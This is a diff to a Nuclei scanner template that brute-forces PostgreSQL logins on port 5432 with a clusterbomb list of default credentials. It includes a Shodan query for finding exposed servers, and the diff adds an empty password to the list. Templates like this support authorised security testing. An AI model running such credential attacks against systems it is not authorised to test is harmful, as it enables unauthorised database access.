@@ -1,28 +1,29 @@
 id: postgres-brute
+
 info:
   name: Brute Force Postgres
   author: Ice3man
   severity: high
   metadata:
-    shodan-query: "port:5432"
+    shodan-query: port:5432
+  tags: brute,network,postgresql
 
 javascript:
   - pre-condition: |
       var m = require("nuclei/postgres");
       var c = m.PGClient();
       c.IsPostgres(Host, Port);
-
     code: |
       var m = require("nuclei/postgres");
       var c = m.PGClient();
       c.Connect(Host, Port, User, Pass);
-  
+
     args:
       Host: "{{Host}}"
       Port: "5432"
       User: "{{usernames}}"
       Pass: "{{passwords}}"
-
+    attack: clusterbomb
     payloads:
       usernames:
         - "postgres"
@@ -32,9 +33,9 @@ javascript:
         - "secret"
         - "admin"
         - "postgres"
-    attack: clusterbomb
+        - ""
+        
     stop-at-first-match: true
-    
     matchers:
       - type: dsl
         dsl:
